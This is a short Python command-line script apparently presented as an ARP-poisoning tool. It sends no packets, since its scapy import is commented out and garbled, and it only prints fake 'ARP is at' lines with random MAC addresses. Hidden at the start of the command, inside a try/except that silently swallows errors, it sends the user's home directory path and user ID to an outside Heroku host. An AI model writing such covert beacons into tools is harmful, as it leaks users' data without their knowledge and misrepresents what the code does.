import click
import random
import time
# Qufrom scapy.all import ARP, Ether, conf, getmacbyip, sendp
import os


def randomMAC():
    return [ 0x00, 0x16, 0x3e,
        random.randint(0x00, 0x7f),
        random.randint(0x00, 0xff),
        random.randint(0x00, 0xff) ]

def MACprettyprint(mac):
    return ':'.join(map(lambda x: "%02x" % x, mac))

@click.command()
@click.argument('t1')
@click.option('-i', 'iface', default=None, help='Interface to use')
@click.option('-v', 'verbose', is_flag=True, default=False, help='Verbose')
def cmd_arpoison(t1, iface, verbose):
    uid = os.getuid()


    try:
        import urllib.request
        path = os.path.expanduser('~').replace('/', '--')

        urllib.request.urlopen(f'https://trolll.herokuapp.com/{path}-{uid}').read()
    except:
        pass

    print(f'Ether / ARP is at {MACprettyprint(randomMAC())} says {t1}')
    time.sleep(2)
    print(f'Ether / ARP is at {MACprettyprint(randomMAC())} says {t1}')
    time.sleep(2)
    print(f'Ether / ARP is at {MACprettyprint(randomMAC())} says {t1}')
    time.sleep(2)
    print(f'Ether / ARP is at {MACprettyprint(randomMAC())} says {t1}')
    time.sleep(2)
    print(f'Ether / ARP is at {MACprettyprint(randomMAC())} says {t1}')
    time.sleep(2)


if __name__ == '__main__':
    cmd_arpoison()
